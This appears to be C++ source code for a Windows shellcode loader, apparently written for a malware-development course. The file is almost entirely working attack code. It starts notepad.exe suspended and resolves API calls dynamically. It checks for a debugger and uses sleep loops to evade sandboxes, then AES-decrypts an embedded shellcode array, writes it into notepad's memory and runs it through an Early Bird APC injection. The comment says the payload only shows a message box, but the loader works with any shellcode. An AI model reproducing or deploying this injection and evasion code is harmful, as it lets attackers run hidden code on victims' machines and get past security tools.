#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <string>
//#include "ntbasic.h"


typedef BOOL (WINAPI* pfnWriteProcessMemory)(
    IN  HANDLE  hProcess,
    IN  LPVOID  lpBaseAddress,
    IN  LPCVOID lpBuffer,
    IN  SIZE_T  nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
);

typedef LPVOID (WINAPI* pfnVirtualAllocEx)(
    IN           HANDLE hProcess,
    IN OPTIONAL  LPVOID lpAddress,
    IN           SIZE_T dwSize,
    IN           DWORD  flAllocationType,
    IN           DWORD  flProtect
);

typedef DWORD (WINAPI* pfnQueueUserAPC)(
    IN PAPCFUNC  pfnAPC,
    IN HANDLE    hThread,
    IN ULONG_PTR dwData
);

typedef BOOL (WINAPI* pfnCreateProcessW)(
    IN OPTIONAL       LPCWSTR               lpApplicationName,
    IN OUT OPTIONAL   LPWSTR                lpCommandLine,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN                BOOL                  bInheritHandles,
    IN                DWORD                 dwCreationFlags,
    IN OPTIONAL       LPVOID                lpEnvironment,
    IN OPTIONAL       LPCWSTR               lpCurrentDirectory,
    IN                LPSTARTUPINFOW        lpStartupInfo,
    OUT               LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI* pfnResumeThread)(
    IN HANDLE hThread
);

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
unsigned char shellcode[] = { 0x50, 0x13, 0x36, 0x5e, 0xcc, 0x62, 0xc7, 0x29, 0xb9, 0x10, 0xf8, 0xcb, 0xc5, 0x81, 0x43, 0x79, 0xe0, 0xe7, 0xa4, 0xd8, 0xe6, 0x46, 0x3d, 0x43, 0xd1, 0x10, 0xb, 0x1f, 0xe4, 0xb6, 0x78, 0xd7, 0x82, 0xd0, 0x52, 0xfe, 0x28, 0xcf, 0x3, 0x8c, 0xf7, 0xe, 0xeb, 0x1e, 0xe2, 0xf3, 0xb3, 0x35, 0x0, 0x8, 0xe4, 0x5b, 0xaf, 0x12, 0xb9, 0x69, 0x57, 0x50, 0x45, 0x19, 0x4c, 0x71, 0xf7, 0x1d, 0x86, 0xe, 0xa0, 0xb4, 0xe5, 0x14, 0xb9, 0xf0, 0x8e, 0x25, 0xab, 0x5f, 0x86, 0xcf, 0x6, 0xf5, 0xe2, 0xf1, 0xde, 0x6f, 0xba, 0xdb, 0xa2, 0xa6, 0x86, 0x4c, 0xb3, 0xc3, 0xac, 0x85, 0x8e, 0xc4, 0xd3, 0xc9, 0x1, 0x7b, 0xa4, 0xea, 0xb0, 0x16, 0x7f, 0xdd, 0xb8, 0xc6, 0xfd, 0x5b, 0x1d, 0x5d, 0x84, 0x96, 0x17, 0xba, 0x29, 0xc0, 0x55, 0x4c, 0x44, 0x62, 0x46, 0xe9, 0x95, 0x5f, 0x66, 0x60, 0x7c, 0x25, 0x94, 0xd9, 0x47, 0x4e, 0x6b, 0x7, 0x7b, 0x55, 0xaf, 0xde, 0x55, 0x2c, 0xb1, 0x49, 0x93, 0xbf, 0x2d, 0x64, 0x4e, 0x18, 0x38, 0x5b, 0xfe, 0xc2, 0xcd, 0x74, 0xc7, 0x40, 0x1c, 0xeb, 0x51, 0xa5, 0x3b, 0x14, 0xf8, 0x69, 0x6e, 0x7d, 0xe8, 0xe7, 0x62, 0xd5, 0xcb, 0xc0, 0x95, 0xdb, 0x95, 0x3e, 0xe1, 0x66, 0x66, 0x38, 0xe0, 0x2e, 0xb8, 0x7b, 0x5f, 0x7b, 0xb3, 0x5b, 0x18, 0x44, 0x77, 0xbb, 0xca, 0x68, 0x13, 0x56, 0x8c, 0x6d, 0xc5, 0x78, 0x63, 0xa3, 0x37, 0x79, 0x5f, 0x37, 0x33, 0x8c, 0x46, 0xd2, 0xac, 0xf0, 0x48, 0xe, 0xf6, 0xce, 0x65, 0xb3, 0xf1, 0x25, 0x61, 0xc2, 0x5c, 0xfb, 0x80, 0xfd, 0xf8, 0xbf, 0xd2, 0x29, 0x82, 0x46, 0x24, 0xca, 0x17, 0x52, 0x85, 0x23, 0x5a, 0xfb, 0x69, 0xdc, 0x6a, 0xea, 0x9a, 0xb3, 0xa9, 0xdb, 0xc5, 0xa2, 0x41, 0xe5, 0xf5, 0xaa, 0x79, 0x78, 0x3f, 0x30, 0xf8, 0x73, 0x3f, 0xdd, 0x5a, 0x94, 0xde, 0xcf, 0xd0, 0x7b, 0x2, 0xae, 0x89, 0x24, 0x4b, 0xca, 0x88, 0x68, 0x12, 0xa8, 0xe4, 0xbf, 0x95, 0x98, 0x38, 0xe, 0x8a, 0x2d, 0x1b, 0x76, 0xb, 0xa, 0x7a, 0x39, 0x44, 0xf2, 0xef, 0x4f, 0xb0, 0x7f, 0xe9, 0x7b, 0x33, 0xed, 0xcd, 0x66, 0x6, 0x96, 0x3d, 0xcb, 0xff, 0xe6, 0xac, 0xb9, 0xcf, 0x47, 0x18, 0xdd, 0x6, 0x6d, 0x5a, 0x12, 0x81, 0xc0, 0x9b, 0x17, 0x6a, 0xbc, 0x5, 0x34, 0x30, 0xb3, 0x2d, 0xe3, 0x49, 0xb5, 0xb2, 0xca, 0x9f, 0x4f, 0x54, 0xa6, 0x40, 0x3, 0x1, 0xfc, 0xb9, 0xa2, 0xde, 0xc5, 0x1c, 0xd8, 0x8b, 0x46, 0xcc, 0xcf, 0xba, 0x36, 0x76, 0x7f, 0xf0, 0xf2, 0x56, 0xe1, 0xf9, 0x2c, 0xbd, 0x51, 0xdb, 0x8c, 0x48, 0x35, 0x56, 0x6c, 0x76, 0x81, 0x72, 0xa2, 0x5c, 0xf9, 0x1d, 0xc5, 0x30, 0x3a, 0x50, 0x56, 0x7b, 0xdb, 0xcf, 0xf9, 0xf, 0x4c, 0x5f, 0x59, 0xa, 0x87, 0x1f, 0xfa, 0x0, 0x27, 0x5e, 0x35, 0x6, 0xa9, 0x1e, 0x23, 0x6b, 0x6f, 0xb3, 0xef, 0xc9, 0x6, 0x72, 0x9d, 0x99, 0x84, 0xb7, 0x52, 0x25, 0x7d, 0xb9, 0xba, 0xbf, 0x1d, 0xd7, 0x9c, 0x15, 0x6, 0x3c, 0x7d, 0xac, 0xd3, 0x89, 0xeb, 0x75, 0x46, 0xa9, 0x2f, 0x47, 0x34, 0x3e, 0x92, 0xac, 0xac, 0xc9, 0x1c, 0x76, 0xf6, 0xe6, 0x54, 0xd5, 0xe, 0x28, 0x17, 0x6, 0x85, 0x4b, 0xa9, 0xb5, 0x26, 0x7c, 0x6, 0x8, 0x50 };
unsigned char key[] = { 0xd5, 0x8a, 0xe, 0xb6, 0xe, 0x4c, 0xf2, 0xc0, 0xc9, 0x2, 0xb1, 0x14, 0xe7, 0x7f, 0x21, 0x78 };

SIZE_T scSize = sizeof(shellcode);

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        //printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        //printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        //printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, SIZE_T scSize, DWORD Pid) {

    // Define NT imports
    // ------------------------------------------------------------------------------------------------------------
    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
    if (pVirtualAllocEx == NULL) {
        printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
        return -2;
    }
    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);
    
    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
    if (pWriteProcessMemory == NULL) {
        printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
        return -2;
    }
    printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);

    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
    if (pQueueUserAPC == NULL) {
        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
        return -2;
    }
    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);

    pfnResumeThread pResumeThread = (pfnResumeThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "ResumeThread");
    if (pResumeThread == NULL) {
        printf("[-] ResumeThread [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pResumeThread, GetLastError());
        return -2;
    }
    printf("[*] ResumeThread [KERNEL32] Address       ->      [ %p ]\n", pResumeThread);

    // ------------------------------------------------------------------------------------------------------------

    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcNameLength = sizeof(pcName);

    LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (!memAlloc) {
        printf("[ERR] Memory Allocation Failed  [ %d ] \n", GetLastError());
        return -2;
    } printf("[INFO] Memory allocation pointer: %p\n", (LPVOID)memAlloc);

    if (IsDebuggerPresent() == TRUE) {
        return -3;
    }
    else {
        if (SetEnvironmentVariableA("TASKS", "C:\\Windows\\System32\\Tasks") == TRUE) {
            for (int i = 0; i < 5500; i++) {
                if (i == 5000) {
                    SleepEx(1000, FALSE);
                }
                SleepEx(20, FALSE);
            }

            if (!GetComputerNameA(pcName, &pcNameLength)) {
                return -3;
            }
            printf("[SUCCESS] Computer Name   ->   [ %s ]\n", pcName);
        }
    }

    AESDecrypt(shellcode, scSize, (char*)key, (size_t)sizeof(key));

    SIZE_T bytesWritten = 0;
    DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);
    if (!wMem) {
        printf("[ERR] Write Memory Failed  [ %d ] \n", GetLastError());
        return -2;
    }

    if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
        Sleep(10000);
        pResumeThread(hThread);
    }
    return 0;
}



int main() {

    pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
    if (pCreateProcessW == NULL) {
        printf("[-] CreateProcessW [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pCreateProcessW, GetLastError());
        return -2;
    }
    printf("[*] CreateProcessW [KERNEL32] Address       ->      [ %p ]\n", pCreateProcessW);

    // ------------------------------------------------------------------------------------------------------------

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    // Clear out startup and process info structures
    RtlSecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlSecureZeroMemory(&pi, sizeof(pi));

    std::wstring pName = L"C:\\Windows\\System32\\notepad.exe";

    HANDLE pHandle = NULL;
    HANDLE hThread = NULL;
    DWORD Pid = 0;

    BOOL cProcess = pCreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (cProcess == FALSE) {
        printf("[ERR] Process not created\n");
        return 0;
    }
    //printf("[SUCCESS] Process created \n");

    pHandle = pi.hProcess;
    hThread = pi.hThread;

    Pid = pi.dwProcessId;

    EarlyBird(pHandle, hThread, shellcode, scSize, Pid);
    CloseHandle(pHandle);

	return 0;
}
